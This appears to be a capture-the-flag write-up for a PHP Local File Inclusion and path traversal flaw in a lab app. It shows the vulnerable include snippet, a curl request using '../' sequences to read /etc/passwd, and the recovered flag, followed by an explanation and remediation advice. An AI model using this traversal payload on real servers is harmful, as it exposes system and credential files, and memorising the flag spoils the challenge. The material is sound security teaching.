## Flag

Vulnerability exploited: Local File Inclusion (LFI) and Path Traversal

```php
<?php include($_GET['page']); ?>
```

Flag Found in the page source when including `/etc/passwd`:

```bash
curl -s "http://localhost:8080/index.php?page=../../../../../../../etc/passwd" \
  | sed -n '1,60p' \
  | grep -oP '(?s)<script.*?>.*?</script>' || echo "no inline <script> found"
# <script>alert('Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 ');</script>
# <script src="js/html5shiv.js"></script>
# <script src="js/jquery.min.js"></script>
# <script src="js/skel.min.js"></script>
# <script src="js/skel-layers.min.js"></script>
# <script src="js/init.js"></script>
```

## Explanation

Local File Inclusion (LFI) is a web vulnerability that allows an attacker to include files on a server through the web browser. This is often due to improper handling of user input in file inclusion functions.
Path Traversal allows an attacker to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with `../` sequences, an attacker can traverse the file system to access sensitive files.

## Remediation

To prevent LFI vulnerabilities, it is crucial to validate and sanitize user inputs rigorously. Here are some best practices:

1. **Input Validation**: Only allow specific, expected values for file paths. Use a whitelist approach where only predefined file names or paths are accepted.

- Allow listing of valid pages only:

  ```php
  <?php
  $allowed_pages = ['home', 'about', 'contact'];
  $page = $_GET['page'] ?? 'home'; // Default to 'home' if not set

  if (in_array($page, $allowed_pages)) {
      include($page . '.php');
  } else {
      // Handle invalid page request
      echo "Invalid page.";
  }
  ?>
  ```

2. **Sanitization**: Remove or encode special characters that could be used for directory traversal (e.g., `../`, `..\\`, `%2e%2e%2f`).
3. **Disable Unnecessary Functions**: If possible, disable functions that are not needed, such as `include`, `require`, etc.
4. **Error Handling**: Avoid displaying detailed error messages to users, as they can provide clues about the file structure of the server.
5. **Regular Security Audits**: Regularly review and test your code for vulnerabilities.
